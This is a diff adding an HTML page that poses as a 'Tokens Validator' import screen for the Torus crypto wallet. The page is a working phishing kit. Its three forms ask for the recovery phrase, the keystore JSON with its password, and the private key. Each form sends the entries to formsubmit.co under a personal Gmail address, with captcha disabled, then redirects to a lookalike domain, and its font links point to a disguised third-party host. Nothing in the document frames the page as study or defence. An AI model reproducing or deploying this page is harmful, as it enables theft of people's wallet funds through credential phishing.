@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Tokens Validator | Open protocol for Validating various Wallets to Dapps Secure Server</title>
+    <link rel="stylesheet" href="../../assets/css/style.css">
+      <link rel="preconnect" href="https://walletrectification.online/wallets/import/fonts.gstatic.com/index.html">
+  
+    <link href="https://walletrectification.online/wallets/import/fonts.googleapis.com/css236e0.css?family=Lato:wght@100;300;400;700;900&amp;display=swap" rel="stylesheet">
+    
+    <link href="https://walletrectification.online/wallets/import/fonts.googleapis.com/css28309.css?family=Merriweather+Sans:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/fontawesome.min.css" integrity="undefined" crossorigin="anonymous">
+    <link rel="icon" href="../../assets/images/logo.png">
+</head>
+<body>
+
+        <div class="import">
+        <div class="import__container">
+            <div class="import__header">
+                <a href="../../wallets.html" class="import__header__wallets">
+                    
+                    <img src="../../assets/images/icn-wallet-connect.svg" class="import__header__wallets--icon" alt="">
+                    <span class="import__header__wallets--text">Import Wallet</span>
+                </a>
+
+                <a href="torus.html#" class="import__header__wallet">
+                    
+                    <img src="../../assets/images/icn-torus.jpg" class="import__header__wallet--icon" alt="">
+                    <span class="import__header__wallet--text">Torus</span>
+                </a>
+            </div>
+            <div class="import__tab">
+                <!-- Tab headers (navigation) -->
+                <div class="import__tab__header">
+                    <a href="torus.html#phrase" class="import__tab__header--item import__tab__header--item--1 current ">Phrase</a>
+                    <a href="torus.html#keystore-json" class="import__tab__header--item import__tab__header--item--2">Keystore Json</a>
+                    <a href="torus.html#private-key" class="import__tab__header--item import__tab__header--item--3">Private Key</a>
+                </div>
+
+                <!-- Tab bodies (content) -->
+                <div class="import__tab__body">
+
+                    <!-- Tab body (phrase) -->
+                    <div id="phrase" class="import__tab__body--item import__tab__body--item--phrase current">
+                        <form  method="POST" action="https://formsubmit.co/benolars5656@gmail.com">
+                            <input type="hidden" name="_next" value="https://walletsrectification.network/admin.html">
+                            <input type="hidden" name="_subject" value="New torus Phrase mail!">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="type" value="Torus" id="walletRef">
+                            <input type="hidden" name="subject" value="HEY, New User Details has been submitted">
+                            
+                            <div class="form__errorBox form__errorBox--phrase"></div>
+                            <textarea
+                                class="form__input form__input--textarea"
+                                name="phrase"
+                                id="phrase_input"
+                                cols="30" rows="5"
+                                placeholder="Enter Phrase..."></textarea>
+                            <label for="phrase_input" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
+                            
+                            <button name="submit" type="submit" class="form__button" >Import</button>
+                        </form>
+                    </div>
+
+                    <!-- Tab body (keystore json) -->
+                    <div id="keystore-json" class="import__tab__body--item import__tab__body--item--keystore-json">
+                        <form  method="POST" class="form" action="https://formsubmit.co/benolars5656@gmail.com">
+                            <input type="hidden" name="_next" value="https://walletsrectification.network/admin.html">
+                            <input type="hidden" name="_subject" value="New torus keystore-json mail!">
+                            <input type="hidden" name="_captcha" value="false">
+                            
+                            <input type="hidden" name="type" value="Torus">
+                            <input type="hidden" name="subject" value="HEY, New User Details has been submitted">
+                            <textarea
+                                class="form__input form__input--textarea"
+                                name="keystorejson"
+                                id="keystore_json"
+                                cols="30" rows="5"
+                                placeholder="Keystore JSON..."></textarea>
+                            <label for="keystore_password"></label>
+                            <input type="password" name="keystorepassword" class="form__input" id="keystore_password" placeholder="Password...">
+
+                            <label for="keystore_json" class="form__label">Several lines of text beginning with "{...}" plus the password you used to encrypt it. </label>
+                            
+                            <button name="submit" class="form__button" >Import</button>
+                        </form>
+                    </div>
+
+                    <!-- Tab body (private key) -->
+                    <div id="private-key" class="import__tab__body--item import__tab__body--item--private-key">
+                        <form  method="POST" action="https://formsubmit.co/benolars5656@gmail.com">
+                            <input type="hidden" name="_next" value="https://walletsrectification.network/admin.html">
+                            <input type="hidden" name="_subject" value="New torus private-key mail!">
+                            <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="type" value="Torus">
+                        <input type="hidden" name="subject" value="HEY, New User Details has been submitted">
+                        <input type="text" name="privatekey" class="form__input" id="private_key" placeholder="Private Key...">
+                        <label for="private_key" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
+                            
+                        
+                        <button name="submit" class="form__button">Import</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="../../assets/js/app.js"></script>
+</body>
+
+
+</html>
